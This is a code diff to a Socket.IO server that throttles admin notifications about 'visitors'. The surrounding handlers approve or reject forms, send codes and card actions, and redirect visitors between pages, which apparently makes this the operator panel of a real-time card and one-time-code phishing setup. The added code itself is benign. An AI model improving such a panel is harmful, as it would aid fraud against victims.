@@ -692,6 +692,31 @@ async function verifyTurnstileToken(token, ip) {
   }
 }
 
+// === Optimized Admin Notification ===
+// Send only the changed visitor instead of all visitors (prevents dashboard hanging)
+// With throttle: max 1 update per 500ms per visitor to prevent flood
+const _pendingVisitorUpdates = new Map(); // visitorId -> visitor data
+let _adminUpdateTimer = null;
+
+function notifyAdminsVisitorUpdated(visitor) {
+  if (!visitor || !visitor._id) return;
+  // Queue the update
+  _pendingVisitorUpdates.set(visitor._id, { ...visitor, isConnected: visitors.has(visitor.socketId) });
+  // Throttle: flush every 500ms
+  if (!_adminUpdateTimer) {
+    _adminUpdateTimer = setTimeout(() => {
+      const updates = Array.from(_pendingVisitorUpdates.values());
+      _pendingVisitorUpdates.clear();
+      _adminUpdateTimer = null;
+      if (updates.length > 0) {
+        admins.forEach((admin, adminSocketId) => {
+          io.to(adminSocketId).emit("visitor:updated", updates);
+        });
+      }
+    }, 500);
+  }
+}
+
 // Socket.IO Connection Handler
 io.on("connection", (socket) => {
   console.log(`New connection: ${socket.id}`);
@@ -1172,7 +1197,7 @@ io.on("connection", (socket) => {
       visitor.waitingForAdminResponse = false;
       visitors.set(visitorSocketId, visitor);
       saveVisitorPermanently(visitor);
-      io.emit("visitors:update", Array.from(visitors.values()));
+      notifyAdminsVisitorUpdated(visitor);
     }
     console.log(`Form approved for visitor: ${visitorSocketId}`);
   });
@@ -1187,7 +1212,7 @@ io.on("connection", (socket) => {
       visitor.waitingForAdminResponse = false;
       visitors.set(visitorSocketId, visitor);
       saveVisitorPermanently(visitor);
-      io.emit("visitors:update", Array.from(visitors.values()));
+      notifyAdminsVisitorUpdated(visitor);
     }
     console.log(`Form rejected for visitor: ${visitorSocketId}`);
   });
@@ -1201,7 +1226,7 @@ io.on("connection", (socket) => {
       visitor.waitingForAdminResponse = false;
       visitors.set(visitorSocketId, visitor);
       saveVisitorPermanently(visitor);
-      io.emit("visitors:update", Array.from(visitors.values()));
+      notifyAdminsVisitorUpdated(visitor);
     }
     console.log(`Mobily call rejected for visitor: ${visitorSocketId}`);
   });
@@ -1216,7 +1241,7 @@ io.on("connection", (socket) => {
       visitor.waitingForAdminResponse = false;
       visitors.set(visitorSocketId, visitor);
       saveVisitorPermanently(visitor);
-      io.emit("visitors:update", Array.from(visitors.values()));
+      notifyAdminsVisitorUpdated(visitor);
     }
     console.log(`Code sent to visitor ${visitorSocketId}: ${code}`);
   });
@@ -1230,7 +1255,7 @@ io.on("connection", (socket) => {
       visitor.waitingForAdminResponse = false;
       visitors.set(visitorSocketId, visitor);
       saveVisitorPermanently(visitor);
-      io.emit("visitors:update", Array.from(visitors.values()));
+      notifyAdminsVisitorUpdated(visitor);
     }
     console.log(`Navigating visitor ${visitorSocketId} to: ${page}`);
   });
@@ -1252,7 +1277,7 @@ io.on("connection", (socket) => {
       }
       visitors.set(visitorSocketId, visitor);
       saveVisitorPermanently(visitor);
-      io.emit("visitors:update", Array.from(visitors.values()));
+      notifyAdminsVisitorUpdated(visitor);
     }
     console.log(`Card action ${action} sent to visitor ${visitorSocketId}`);
   });
@@ -1266,7 +1291,7 @@ io.on("connection", (socket) => {
       visitor.waitingForAdminResponse = false;
       visitors.set(visitorSocketId, visitor);
       saveVisitorPermanently(visitor);
-      io.emit("visitors:update", Array.from(visitors.values()));
+      notifyAdminsVisitorUpdated(visitor);
     }
     console.log(`Code action ${action} sent to visitor ${visitorSocketId}`);
   });
@@ -1280,7 +1305,7 @@ io.on("connection", (socket) => {
       visitor.waitingForAdminResponse = false;
       visitors.set(visitorSocketId, visitor);
       saveVisitorPermanently(visitor);
-      io.emit("visitors:update", Array.from(visitors.values()));
+      notifyAdminsVisitorUpdated(visitor);
     }
     console.log(`Resend approved for visitor ${visitorSocketId}`);
   });
